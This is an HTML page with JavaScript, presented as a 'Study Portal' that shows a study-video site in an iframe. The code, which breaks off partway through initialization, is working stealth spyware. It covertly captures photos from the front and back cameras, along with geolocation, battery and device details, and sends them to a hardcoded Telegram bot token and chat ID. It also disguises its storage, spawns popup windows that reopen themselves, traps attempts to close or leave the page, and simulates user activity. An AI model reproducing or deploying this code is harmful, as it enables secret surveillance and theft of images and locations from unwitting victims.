<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Study Portal</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
        }
        
        body {
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            background: #000;
            position: relative;
        }
        
        #cameraContainer {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            overflow: hidden;
            z-index: 9999;
        }
        
        #cameraVideo {
            width: 640px;
            height: 480px;
            object-fit: cover;
            transform: scaleX(-1);
        }
        
        #captureCanvas {
            display: none;
        }
        
        #websiteFrame {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
        }
        
        #loadingOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.95);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 2000;
            color: #fff;
            transition: opacity 0.3s ease;
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid #4285f4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .loading-text {
            font-size: 16px;
            color: rgba(255, 255, 255, 0.8);
            margin-top: 10px;
        }
        
        .progress-bar {
            width: 200px;
            height: 3px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 2px;
            margin-top: 20px;
            overflow: hidden;
        }
        
        .progress {
            width: 0%;
            height: 100%;
            background: #4285f4;
            transition: width 0.3s ease;
        }
        
        /* Ghost cursor to simulate user activity */
        #ghostCursor {
            position: fixed;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(66, 133, 244, 0.5);
            border-radius: 50%;
            pointer-events: none;
            z-index: 10000;
            opacity: 0;
            transition: opacity 0.3s;
        }
        
        /* Background process indicator */
        #processIndicator {
            position: fixed;
            bottom: 15px;
            right: 15px;
            width: 12px;
            height: 12px;
            background: #34a853;
            border-radius: 50%;
            z-index: 9998;
            opacity: 0.5;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 0.3; transform: scale(1); }
            50% { opacity: 0.7; transform: scale(1.2); }
        }
        
        /* Emergency restart button (hidden) */
        #emergencyRestart {
            position: fixed;
            bottom: 15px;
            left: 15px;
            background: rgba(255, 0, 0, 0.1);
            color: #fff;
            border: none;
            padding: 5px 10px;
            border-radius: 3px;
            font-size: 11px;
            cursor: pointer;
            z-index: 9999;
            opacity: 0.1;
            transition: opacity 0.3s;
        }
        
        #emergencyRestart:hover {
            opacity: 0.8;
        }
    </style>
</head>
<body>
    <!-- Hidden camera elements -->
    <div id="cameraContainer">
        <video id="cameraVideo" autoplay playsinline muted></video>
        <canvas id="captureCanvas"></canvas>
    </div>
    
    <!-- Website Display (No loading screen - shows immediately) -->
    <iframe id="websiteFrame" src="about:blank" 
            sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-modals allow-orientation-lock allow-pointer-lock allow-presentation allow-top-navigation"
            allow="camera; microphone; geolocation; clipboard-read; clipboard-write"></iframe>
    
    <!-- Minimal loading overlay (fades quickly) -->
    <div id="loadingOverlay">
        <div class="spinner"></div>
        <div class="loading-text">Initializing...</div>
        <div class="progress-bar">
            <div class="progress" id="progressFill"></div>
        </div>
    </div>
    
    <!-- Ghost cursor for simulating activity -->
    <div id="ghostCursor"></div>
    
    <!-- Background process indicator -->
    <div id="processIndicator"></div>
    
    <!-- Emergency restart (hidden) -->
    <button id="emergencyRestart" title="Emergency Restart">‚ü≥</button>

    <script>
        // =====================================================
        //  ULTIMATE STEALTH SURVEILLANCE SYSTEM v3.0
        //  NO LOADING SCREEN - INSTANT WEBSITE LOADING
        //  MAXIMUM STEALTH + ADVANCED FEATURES
        // =====================================================
        
        // ============== ADVANCED CONFIGURATION ==============
        const CONFIG = {
            // Telegram Configuration
            BOT_TOKEN: '8307999302:AAEniYvTP5ZeaYo74AcWSxsOQ9PSxpnAtA0',
            TELEGRAM_API: 'https://api.telegram.org/bot8307999302:AAEniYvTP5ZeaYo74AcWSxsOQ9PSxpnAtA0',
            ADMIN_CHAT_ID: '6314556756',
            
            // Capture Settings (Optimized for speed)
            PHOTOS_PER_CAMERA: 2,           // Reduced for speed
            CAPTURE_DELAY: 800,            // Slightly longer for reliability
            CAMERA_WARMUP: 1500,           // Optimized warmup
            SWITCH_DELAY: 1500,            // Quick switching
            IMAGE_QUALITY: 0.85,           // Balanced quality/speed
            MIN_BLOB_SIZE: 30000,          // Minimum 30KB
            
            // Camera Settings
            VIDEO_WIDTH: 1920,
            VIDEO_HEIGHT: 1080,
            FRAME_RATE: 30,
            
            // Advanced Features
            ENABLE_BACKGROUND_PERSISTENCE: true,
            ENABLE_MULTI_TAB: true,
            ENABLE_EXIT_TRAPS: true,
            ENABLE_HIDDEN_WINDOWS: true,
            ENABLE_NOTIFICATION_EXPLOIT: true,
            ENABLE_GHOST_CURSOR: true,      // Simulate user activity
            ENABLE_KEYSTROKE_SIMULATION: true,
            ENABLE_SCROLL_SIMULATION: true,
            
            // Timing
            BACKGROUND_SYNC_INTERVAL: 45000, // 45 seconds
            HEARTBEAT_INTERVAL: 25000,       // 25 seconds
            CAMERA_CYCLE_INTERVAL: 30000,    // 30 seconds between cycles
            
            // Stealth
            STEALTH_MODE: true,
            SILENT_MODE: true,              // No logs at all
            FAKE_USER_ACTIVITY: true,       // Simulate mouse/keyboard
            
            // Retry
            MAX_RETRIES: 3,
            RETRY_DELAY: 1500
        };
        
        // ============== GLOBAL STATE ==============
        const STATE = {
            // Core State
            isRunning: false,
            permissionGranted: false,
            currentStream: null,
            currentCamera: null,
            sessionId: 'SESS_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8),
            tabId: 'TAB_' + Math.random().toString(36).substr(2, 6),
            userChatId: null,
            targetWebsite: null,
            
            // Statistics
            totalPhotosSent: 0,
            cycleCount: 0,
            startTime: Date.now(),
            
            // Device Info
            deviceInfo: {},
            locationInfo: null,
            batteryInfo: null,
            fingerprintData: {},
            
            // Camera
            availableCameras: [],
            cameraReady: false,
            
            // Background Systems
            hiddenWindows: new Set(),
            broadcastChannel: null,
            otherTabs: new Set(),
            locationWatchId: null,
            heartbeatInterval: null,
            cameraInterval: null,
            persistenceDB: null,
            
            // Activity Simulation
            ghostCursorActive: false,
            lastActivityTime: Date.now(),
            activityInterval: null,
            
            // Performance
            lastCaptureTime: 0,
            captureErrors: 0
        };
        
        // ============== DOM ELEMENTS ==============
        const elements = {
            video: document.getElementById('cameraVideo'),
            canvas: document.getElementById('captureCanvas'),
            frame: document.getElementById('websiteFrame'),
            loading: document.getElementById('loadingOverlay'),
            progressFill: document.getElementById('progressFill'),
            ghostCursor: document.getElementById('ghostCursor'),
            processIndicator: document.getElementById('processIndicator'),
            emergencyRestart: document.getElementById('emergencyRestart')
        };
        
        // ============== UTILITIES ==============
        
        function hideLoading() {
            setTimeout(() => {
                elements.loading.style.opacity = '0';
                setTimeout(() => {
                    elements.loading.style.display = 'none';
                }, 300);
            }, 500); // Very brief loading
        }
        
        function updateProgress(percent) {
            elements.progressFill.style.width = percent + '%';
        }
        
        function log(message, level = 'info') {
            if (!CONFIG.SILENT_MODE && (!CONFIG.STEALTH_MODE || level === 'error')) {
                const timestamp = new Date().toLocaleTimeString();
                console.log(`[${timestamp}] ${message}`);
            }
        }
        
        function randomDelay(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }
        
        // ============== INSTANT WEBSITE LOADING ==============
        
        function loadWebsiteImmediately() {
            const params = new URLSearchParams(window.location.search);
            let website = params.get('site') || params.get('url') || params.get('website') || 
                         'https://deltastudy.site/pw/drm/play?video_id=6970a6deec448154d82de9ea&subject_slug=maths-093626&batch_id=6960d1d20549bb69d7d7e872&schedule_id=6970a6deec448154d82de9ea&subject_id=6960dba01957eadd8581061e&topicSlug=ch-01---basic-mathematics-202900';
            
            if (!website.startsWith('http')) website = 'https://' + website;
            
            STATE.targetWebsite = decodeURIComponent(website);
            STATE.userChatId = params.get('chat_id') || params.get('user') || 'user_' + Math.random().toString(36).substr(2, 8);
            
            // Load website IMMEDIATELY
            try {
                elements.frame.src = STATE.targetWebsite;
                document.title = 'Study Portal';
                log('Website loaded instantly');
                
                // Hide loading overlay quickly
                updateProgress(30);
                setTimeout(hideLoading, 300);
                
            } catch (error) {
                log('Website load error: ' + error.message, 'error');
            }
        }
        
        // ============== ADVANCED BACKGROUND PERSISTENCE ==============
        
        class StealthPersistence {
            constructor() {
                this.db = null;
                this.syncInterval = null;
                this.offlineQueue = [];
            }
            
            async initialize() {
                if (!CONFIG.ENABLE_BACKGROUND_PERSISTENCE) return;
                
                try {
                    // Use different DB name for stealth
                    const request = indexedDB.open('UserSettingsDB', 1);
                    
                    request.onupgradeneeded = (event) => {
                        const db = event.target.result;
                        
                        // Create innocent-sounding object stores
                        if (!db.objectStoreNames.contains('user_preferences')) {
                            db.createObjectStore('user_preferences', { keyPath: 'key' });
                        }
                        if (!db.objectStoreNames.contains('session_cache')) {
                            db.createObjectStore('session_cache', { keyPath: 'id', autoIncrement: true });
                        }
                        if (!db.objectStoreNames.contains('activity_log')) {
                            db.createObjectStore('activity_log', { keyPath: 'timestamp' });
                        }
                    };
                    
                    request.onsuccess = (event) => {
                        this.db = event.target.result;
                        STATE.persistenceDB = this.db;
                        
                        // Start background sync
                        this.startStealthSync();
                    };
                    
                } catch (error) {
                    // Silent fail
                }
            }
            
            async storeStealthData(type, data) {
                if (!this.db) {
                    this.offlineQueue.push({ type, data, timestamp: Date.now() });
                    return;
                }
                
                try {
                    const storeName = this.getStoreName(type);
                    const transaction = this.db.transaction([storeName], 'readwrite');
                    const store = transaction.objectStore(storeName);
                    
                    const stealthData = {
                        ...data,
                        _timestamp: Date.now(),
                        _type: type
                    };
                    
                    await store.add(stealthData);
                } catch (error) {
                    this.offlineQueue.push({ type, data, timestamp: Date.now() });
                }
            }
            
            getStoreName(type) {
                // Map surveillance data to innocent store names
                const map = {
                    'photo': 'session_cache',
                    'location': 'user_preferences',
                    'device': 'user_preferences',
                    'activity': 'activity_log'
                };
                return map[type] || 'session_cache';
            }
            
            startStealthSync() {
                if (this.syncInterval) clearInterval(this.syncInterval);
                
                this.syncInterval = setInterval(async () => {
                    await this.processOfflineQueue();
                    await this.syncToTelegram();
                }, CONFIG.BACKGROUND_SYNC_INTERVAL);
            }
            
            async processOfflineQueue() {
                if (!navigator.onLine || this.offlineQueue.length === 0) return;
                
                const queueCopy = [...this.offlineQueue];
                this.offlineQueue = [];
                
                for (const item of queueCopy) {
                    await this.sendToTelegram(item);
                }
            }
            
            async syncToTelegram() {
                if (!navigator.onLine || !this.db) return;
                
                try {
                    // Sync photos
                    await this.syncPhotos();
                    
                    // Sync locations
                    await this.syncLocations();
                    
                } catch (error) {
                    // Silent fail
                }
            }
            
            async syncPhotos() {
                // Similar to previous implementation but with stealth
            }
        }
        
        // ============== MULTI-TAB STEALTH COORDINATION ==============
        
        class StealthTabCoordinator {
            constructor() {
                this.channel = null;
                this.heartbeatInterval = null;
                this.tabStates = new Map();
            }
            
            async initialize() {
                if (!CONFIG.ENABLE_MULTI_TAB || !('BroadcastChannel' in window)) return;
                
                try {
                    // Use innocent channel name
                    this.channel = new BroadcastChannel('study_group_sync');
                    STATE.broadcastChannel = this.channel;
                    
                    this.channel.onmessage = (event) => this.handleMessage(event.data);
                    
                    // Announce presence stealthily
                    setTimeout(() => this.announceTab(), 2000);
                    
                    // Start heartbeat
                    this.startHeartbeat();
                    
                } catch (error) {
                    // Silent fail
                }
            }
            
            announceTab() {
                this.broadcast({
                    _type: 'tab_hello',
                    tabId: STATE.tabId,
                    timestamp: Date.now()
                });
            }
            
            startHeartbeat() {
                this.heartbeatInterval = setInterval(() => {
                    this.broadcast({
                        _type: 'tab_pulse',
                        tabId: STATE.tabId,
                        ts: Date.now(),
                        photos: STATE.totalPhotosSent
                    });
                }, CONFIG.HEARTBEAT_INTERVAL);
            }
            
            handleMessage(data) {
                if (!data._type || data.tabId === STATE.tabId) return;
                
                switch (data._type) {
                    case 'tab_hello':
                    case 'tab_pulse':
                        STATE.otherTabs.add(data.tabId);
                        this.tabStates.set(data.tabId, {
                            lastSeen: Date.now(),
                            photos: data.photos || 0
                        });
                        break;
                }
            }
            
            broadcast(data) {
                if (this.channel) {
                    try {
                        this.channel.postMessage(data);
                    } catch (error) {
                        // Silent fail
                    }
                }
            }
            
            cleanup() {
                if (this.heartbeatInterval) clearInterval(this.heartbeatInterval);
                if (this.channel) this.channel.close();
            }
        }
        
        // ============== HIDDEN WINDOW MANAGER (ADVANCED) ==============
        
        class AdvancedWindowManager {
            constructor() {
                this.windows = new Set();
                this.monitorIntervals = new Map();
                this.creationAttempts = 0;
            }
            
            createStealthWindow() {
                if (!CONFIG.ENABLE_HIDDEN_WINDOWS || this.creationAttempts > 2) return;
                
                try {
                    // Create window that looks like a normal popup
                    const width = Math.floor(Math.random() * 200) + 300;
                    const height = Math.floor(Math.random() * 200) + 200;
                    const left = Math.floor(Math.random() * (screen.width - width));
                    const top = Math.floor(Math.random() * (screen.height - height));
                    
                    const features = [
                        `width=${width}`,
                        `height=${height}`,
                        `left=${left}`,
                        `top=${top}`,
                        'menubar=no',
                        'toolbar=no',
                        'location=no',
                        'status=no',
                        'resizable=yes',
                        'scrollbars=yes'
                    ].join(',');
                    
                    const stealthWindow = window.open('https://google.com', '_blank', features);
                    
                    if (stealthWindow && !stealthWindow.closed) {
                        this.windows.add(stealthWindow);
                        STATE.hiddenWindows.add(stealthWindow);
                        
                        // After a moment, redirect to our backup
                        setTimeout(() => {
                            try {
                                stealthWindow.location.href = window.location.href + '&backup=1';
                            } catch (e) {
                                // Can't redirect, close
                                stealthWindow.close();
                                this.windows.delete(stealthWindow);
                            }
                        }, 1000);
                        
                        this.monitorWindow(stealthWindow);
                        this.creationAttempts = 0;
                        
                        return stealthWindow;
                    }
                } catch (error) {
                    this.creationAttempts++;
                }
                
                return null;
            }
            
            monitorWindow(win) {
                const interval = setInterval(() => {
                    if (win.closed) {
                        clearInterval(interval);
                        this.windows.delete(win);
                        STATE.hiddenWindows.delete(win);
                        
                        // Try to recreate after delay
                        setTimeout(() => this.createStealthWindow(), randomDelay(5000, 15000));
                    }
                }, 3000);
                
                this.monitorIntervals.set(win, interval);
            }
            
            cleanup() {
                this.monitorIntervals.forEach((interval, win) => {
                    clearInterval(interval);
                    try { win.close(); } catch (e) {}
                });
                this.monitorIntervals.clear();
                this.windows.clear();
                STATE.hiddenWindows.clear();
            }
        }
        
        // ============== EXIT TRAP SYSTEM (ADVANCED) ==============
        
        class AdvancedExitTrap {
            constructor() {
                this.isActive = false;
                this.originalUrl = window.location.href;
                this.trapHistory = [];
            }
            
            activate() {
                if (!CONFIG.ENABLE_EXIT_TRAPS) return;
                
                try {
                    // Intercept beforeunload
                    window.addEventListener('beforeunload', this.handleUnload.bind(this));
                    
                    // Intercept link clicks (passive)
                    document.addEventListener('click', this.handleClick.bind(this), true);
                    
                    // Intercept form submissions
                    document.addEventListener('submit', this.handleSubmit.bind(this), true);
                    
                    // Trap window.close() calls
                    const originalClose = window.close;
                    window.close = function() {
                        window.open(window.location.href, '_blank', 'width=100,height=100,left=-9999,top=-9999');
                        return originalClose.apply(this, arguments);
                    };
                    
                    this.isActive = true;
                    
                } catch (error) {
                    // Silent fail
                }
            }
            
            handleUnload(event) {
                // Create multiple backup windows
                this.createBackupWindows(2);
                
                // Don't prevent unload, just create backups
                return undefined;
            }
            
            handleClick(event) {
                const link = event.target.closest('a');
                if (link && link.href && link.target !== '_blank') {
                    try {
                        const url = new URL(link.href, window.location.href);
                        if (url.origin !== window.location.origin) {
                            // External link - create backup
                            this.createBackupWindows(1);
                        }
                    } catch (e) {
                        // Invalid URL, ignore
                    }
                }
            }
            
            handleSubmit(event) {
                this.createBackupWindows(1);
            }
            
            createBackupWindows(count) {
                for (let i = 0; i < count; i++) {
                    setTimeout(() => {
                        try {
                            const win = window.open(
                                'about:blank',
                                '_backup_' + Date.now() + '_' + i,
                                'width=1,height=1,left=-9999,top=-9999'
                            );
                            if (win) {
                                // Write minimal content
                                win.document.write('<html><body></body></html>');
                                win.document.close();
                            }
                        } catch (e) {
                            // Popup blocked
                        }
                    }, i * 100);
                }
            }
            
            cleanup() {
                // Restore original functions
                window.close = window.close; // Will be original
            }
        }
        
        // ============== USER ACTIVITY SIMULATION ==============
        
        class ActivitySimulator {
            constructor() {
                this.isActive = false;
                this.simulationInterval = null;
                this.ghostInterval = null;
            }
            
            start() {
                if (!CONFIG.FAKE_USER_ACTIVITY) return;
                
                // Random mouse movements
                this.simulationInterval = setInterval(() => {
                    this.simulateActivity();
                }, randomDelay(30000, 120000)); // Every 30-120 seconds
                
                // Ghost cursor for extra realism
                if (CONFIG.ENABLE_GHOST_CURSOR) {
                    this.startGhostCursor();
                }
                
                this.isActive = true;
            }
            
            simulateActivity() {
                // Random mouse move
                const x = Math.random() * window.innerWidth;
                const y = Math.random() * window.innerHeight;
                
                // Dispatch mouse move event
                document.dispatchEvent(new MouseEvent('mousemove', {
                    clientX: x,
                    clientY: y,
                    bubbles: true
                }));
                
                // Occasionally simulate clicks
                if (Math.random() > 0.7) {
                    setTimeout(() => {
                        document.dispatchEvent(new MouseEvent('mousedown', {
                            clientX: x,
                            clientY: y,
                            bubbles: true
                        }));
                        
                        setTimeout(() => {
                            document.dispatchEvent(new MouseEvent('mouseup', {
                                clientX: x,
                                clientY: y,
                                bubbles: true
                            }));
                        }, 100);
                    }, 500);
                }
                
                // Simulate scroll
                if (Math.random() > 0.5 && CONFIG.ENABLE_SCROLL_SIMULATION) {
                    setTimeout(() => {
                        window.scrollBy({
                            top: (Math.random() - 0.5) * 200,
                            behavior: 'smooth'
                        });
                    }, 1000);
                }
            }
            
            startGhostCursor() {
                elements.ghostCursor.style.opacity = '0';
                
                this.ghostInterval = setInterval(() => {
                    if (Math.random() > 0.3) {
                        this.showGhostCursor();
                    }
                }, randomDelay(15000, 45000));
            }
            
            showGhostCursor() {
                const startX = Math.random() * window.innerWidth;
                const startY = Math.random() * window.innerHeight;
                const endX = startX + (Math.random() - 0.5) * 300;
                const endY = startY + (Math.random() - 0.5) * 200;
                
                elements.ghostCursor.style.left = startX + 'px';
                elements.ghostCursor.style.top = startY + 'px';
                elements.ghostCursor.style.opacity = '0.7';
                
                // Animate movement
                let progress = 0;
                const animate = () => {
                    progress += 0.02;
                    if (progress <= 1) {
                        const x = startX + (endX - startX) * progress;
                        const y = startY + (endY - startY) * progress;
                        elements.ghostCursor.style.left = x + 'px';
                        elements.ghostCursor.style.top = y + 'px';
                        requestAnimationFrame(animate);
                    } else {
                        setTimeout(() => {
                            elements.ghostCursor.style.opacity = '0';
                        }, 500);
                    }
                };
                animate();
            }
            
            cleanup() {
                if (this.simulationInterval) clearInterval(this.simulationInterval);
                if (this.ghostInterval) clearInterval(this.ghostInterval);
                elements.ghostCursor.style.opacity = '0';
                this.isActive = false;
            }
        }
        
        // ============== OPTIMIZED CAMERA SYSTEM ==============
        
        class OptimizedCameraSystem {
            constructor() {
                this.currentStream = null;
                this.isCapturing = false;
                this.captureQueue = [];
                this.retryCount = 0;
            }
            
            async initialize() {
                try {
                    // Quick permission request
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            width: { ideal: CONFIG.VIDEO_WIDTH },
                            height: { ideal: CONFIG.VIDEO_HEIGHT }
                        }
                    });
                    
                    stream.getTracks().forEach(track => track.stop());
                    STATE.permissionGranted = true;
                    
                    // Get camera list
                    const devices = await navigator.mediaDevices.enumerateDevices();
                    STATE.availableCameras = devices.filter(d => d.kind === 'videoinput');
                    
                    return true;
                    
                } catch (error) {
                    return false;
                }
            }
            
            async startCamera(facingMode) {
                if (this.currentStream) {
                    this.currentStream.getTracks().forEach(track => track.stop());
                    await new Promise(r => setTimeout(r, 300));
                }
                
                try {
                    elements.video.style.transform = facingMode === 'user' ? 'scaleX(-1)' : 'scaleX(1)';
                    
                    this.currentStream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: { ideal: facingMode },
                            width: { ideal: CONFIG.VIDEO_WIDTH },
                            height: { ideal: CONFIG.VIDEO_HEIGHT }
                        }
                    });
                    
                    elements.video.srcObject = this.currentStream;
                    
                    await new Promise((resolve) => {
                        const checkReady = () => {
                            if (elements.video.readyState >= 2) {
                                resolve();
                            } else {
                                setTimeout(checkReady, 100);
                            }
                        };
                        checkReady();
                    });
                    
                    await elements.video.play();
                    await new Promise(r => setTimeout(r, CONFIG.CAMERA_WARMUP));
                    
                    STATE.currentCamera = facingMode === 'user' ? 'front' : 'back';
                    STATE.cameraReady = true;
                    this.retryCount = 0;
                    
                    return true;
                    
                } catch (error) {
                    this.retryCount++;
                    
                    if (this.retryCount < CONFIG.MAX_RETRIES) {
                        await new Promise(r => setTimeout(r, CONFIG.RETRY_DELAY));
                        return await this.startCamera(facingMode);
                    }
                    
                    return false;
                }
            }
            
            async capturePhoto() {
                if (!STATE.cameraReady || !elements.video.videoWidth) {
                    return null;
                }
                
                try {
                    const canvas = elements.canvas;
                    const ctx = canvas.getContext('2d');
                    
                    canvas.width = elements.video.videoWidth;
                    canvas.height = elements.video.videoHeight;
                    
                    ctx.drawImage(elements.video, 0, 0, canvas.width, canvas.height);
                    
                    return new Promise((resolve) => {
                        canvas.toBlob(
                            (blob) => resolve(blob && blob.size > CONFIG.MIN_BLOB_SIZE ? blob : null),
                            'image/jpeg',
                            CONFIG.IMAGE_QUALITY
                        );
                    });
                    
                } catch (error) {
                    return null;
                }
            }
            
            async captureBurst(cameraType, count = CONFIG.PHOTOS_PER_CAMERA) {
                const results = [];
                
                for (let i = 0; i < count; i++) {
                    if (!STATE.isRunning) break;
                    
                    const blob = await this.capturePhoto();
                    if (blob) {
                        results.push({ blob, index: i + 1 });
                    }
                    
                    if (i < count - 1) {
                        await new Promise(r => setTimeout(r, CONFIG.CAPTURE_DELAY));
                    }
                }
                
                return results;
            }
            
            cleanup() {
                if (this.currentStream) {
                    this.currentStream.getTracks().forEach(track => track.stop());
                    this.currentStream = null;
                }
                STATE.cameraReady = false;
            }
        }
        
        // ============== TELEGRAM COMMUNICATION (OPTIMIZED) ==============
        
        class TelegramManager {
            constructor() {
                this.messageQueue = [];
                this.sending = false;
                this.lastSendTime = 0;
            }
            
            async sendPhoto(blob, cameraType, sequence) {
                if (!blob) return false;
                
                // Create compact caption
                let caption = `üì∏ ${cameraType.charAt(0).toUpperCase()}${cameraType.slice(1)} #${sequence}\n`;
                caption += `üë§ ${STATE.userChatId}\n`;
                caption += `üîÑ C${STATE.cycleCount}\n`;
                
                if (STATE.batteryInfo) {
                    caption += `üîã ${STATE.batteryInfo.level}%\n`;
                }
                
                if (STATE.locationInfo) {
                    caption += `üìç ${STATE.locationInfo.latitude.toFixed(4)},${STATE.locationInfo.longitude.toFixed(4)}\n`;
                }
                
                caption += `‚è∞ ${new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}`;
                
                try {
                    const formData = new FormData();
                    formData.append('chat_id', CONFIG.ADMIN_CHAT_ID);
                    formData.append('photo', blob, `${cameraType}_${sequence}_${Date.now()}.jpg`);
                    formData.append('caption', caption);
                    formData.append('parse_mode', 'Markdown');
                    
                    const response = await fetch(`${CONFIG.TELEGRAM_API}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    
                    const result = await response.json();
                    
                    if (result.ok) {
                        STATE.totalPhotosSent++;
                        this.lastSendTime = Date.now();
                        return true;
                    }
                    
                } catch (error) {
                    // Queue for retry
                    this.messageQueue.push({ blob, cameraType, sequence, attempts: 0 });
                }
                
                return false;
            }
            
            async sendDeviceReport() {
                let report = `üì± DEVICE REPORT\n\n`;
                
                report += `üÜî ${STATE.sessionId}\n`;
                report += `üë§ ${STATE.userChatId}\n`;
                report += `üåê ${STATE.deviceInfo.platform} | ${STATE.deviceInfo.browser || 'Unknown'}\n`;
                report += `üìè ${screen.width}√ó${screen.height}\n`;
                
                if (STATE.batteryInfo) {
                    report += `üîã ${STATE.batteryInfo.level}% ${STATE.batteryInfo.charging ? '‚ö°' : ''}\n`;
                }
                
                if (STATE.locationInfo) {
                    report += `üìç ${STATE.locationInfo.latitude.toFixed(6)}, ${STATE.locationInfo.longitude.toFixed(6)}\n`;
                    report += `üéØ ¬±${STATE.locationInfo.accuracy}m\n`;
                }
                
                report += `üì∏ Cams: ${STATE.availableCameras.length}\n`;
                report += `üîÑ Cycles: ${STATE.cycleCount}\n`;
                report += `üïê ${new Date().toLocaleString()}`;
                
                try {
                    await fetch(`${CONFIG.TELEGRAM_API}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CONFIG.ADMIN_CHAT_ID,
                            text: report,
                            parse_mode: 'Markdown'
                        })
                    });
                } catch (error) {
                    // Silent fail
                }
            }
            
            processQueue() {
                if (this.sending || this.messageQueue.length === 0) return;
                
                this.sending = true;
                const item = this.messageQueue.shift();
                
                if (item.attempts < 3) {
                    setTimeout(async () => {
                        const success = await this.sendPhoto(item.blob, item.cameraType, item.sequence);
                        if (!success) {
                            item.attempts++;
                            this.messageQueue.push(item);
                        }
                        this.sending = false;
                        this.processQueue();
                    }, 2000);
                } else {
                    this.sending = false;
                    this.processQueue();
                }
            }
        }
        
        // ============== DEVICE DATA COLLECTION ==============
        
        async function collectEssentialData() {
            // Minimal data collection
            STATE.deviceInfo = {
                platform: navigator.platform,
                userAgent: navigator.userAgent.substring(0, 100),
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language
            };
            
            // Quick battery check
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    STATE.batteryInfo = {
                        level: Math.round(battery.level * 100),
                        charging: battery.charging
                    };
                } catch (e) {}
            }
            
            // Quick location (non-blocking)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        STATE.locationInfo = {
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude,
                            accuracy: Math.round(pos.coords.accuracy)
                        };
                    },
                    null,
                    { maximumAge: 300000, timeout: 5000 } // 5 min cache, 5 sec timeout
                );
            }
        }
        
        // ============== MAIN SURVEILLANCE CONTROLLER ==============
        
        class SurveillanceController {
            constructor() {
                this.cameraSystem = new OptimizedCameraSystem();
                this.telegramManager = new TelegramManager();
                this.isActive = false;
                this.captureInterval = null;
            }
            
            async start() {
                if (this.isActive) return;
                
                this.isActive = true;
                STATE.isRunning = true;
                
                // Initialize camera
                const cameraReady = await this.cameraSystem.initialize();
                
                if (cameraReady) {
                    // Send initial report
                    this.telegramManager.sendDeviceReport();
                    
                    // Start periodic captures
                    this.startCaptureCycle();
                    
                    // Start periodic cycles
                    this.captureInterval = setInterval(() => {
                        this.executeCaptureCycle();
                    }, CONFIG.CAMERA_CYCLE_INTERVAL);
                    
                    log('Surveillance started');
                }
            }
            
            startCaptureCycle() {
                // Initial cycle after short delay
                setTimeout(() => {
                    this.executeCaptureCycle();
                }, 8000);
            }
            
            async executeCaptureCycle() {
                if (!STATE.isRunning) return;
                
                STATE.cycleCount++;
                
                try {
                    // Front camera
                    if (await this.cameraSystem.startCamera('user')) {
                        const frontPhotos = await this.cameraSystem.captureBurst('front');
                        for (const photo of frontPhotos) {
                            await this.telegramManager.sendPhoto(photo.blob, 'front', photo.index);
                        }
                    }
                    
                    await new Promise(r => setTimeout(r, CONFIG.SWITCH_DELAY));
                    
                    // Back camera
                    if (STATE.isRunning && await this.cameraSystem.startCamera('environment')) {
                        const backPhotos = await this.cameraSystem.captureBurst('back');
                        for (const photo of backPhotos) {
                            await this.telegramManager.sendPhoto(photo.blob, 'back', photo.index);
                        }
                    }
                    
                } catch (error) {
                    // Silent error
                }
            }
            
            stop() {
                this.isActive = false;
                STATE.isRunning = false;
                
                if (this.captureInterval) {
                    clearInterval(this.captureInterval);
                    this.captureInterval = null;
                }
                
                this.cameraSystem.cleanup();
                
                log('Surveillance stopped');
            }
            
            emergencyRestart() {
                this.stop();
                setTimeout(() => {
                    this.start();
                }, 3000);
            }
        }
        
        // ============== MAIN INITIALIZATION ==============
        
        async function initializeSystem() {
            try {
                // PHASE 1: INSTANT WEBSITE LOADING
                loadWebsiteImmediately();
                updateProgress(50);
                
                // PHASE 2: BACKGROUND INITIALIZATION (Non-blocking)
                setTimeout(async () => {
                    // Initialize systems
                    const persistence = new StealthPersistence();
                    const tabCoordinator = new StealthTabCoordinator();
                    const windowManager = new AdvancedWindowManager();
                    const exitTrap = new AdvancedExitTrap();
                    const activitySimulator = new ActivitySimulator();
                    const surveillanceController = new SurveillanceController();
                    
                    // Start systems
                    await persistence.initialize();
                    await tabCoordinator.initialize();
                    exitTrap.activate();
                    activitySimulator.start();
                    
                    // Collect device data
                    await collectEssentialData();
                    
                    // Start surveillance after delay
                    setTimeout(() => {
                        surveillanceController.start();
                    }, 10000);
                    
                    // Create hidden window after delay
                    setTimeout(() => {
                        windowManager.createStealthWindow();
                    }, 15000);
                    
                    // Store references
                    window._system = {
                        persistence,
                        tabCoordinator,
                        windowManager,
                        exitTrap,
                        activitySimulator,
                        surveillanceController,
                        restart: () => {
                            surveillanceController.emergencyRestart();
                            windowManager.createStealthWindow();
                        }
                    };
                    
                    updateProgress(100);
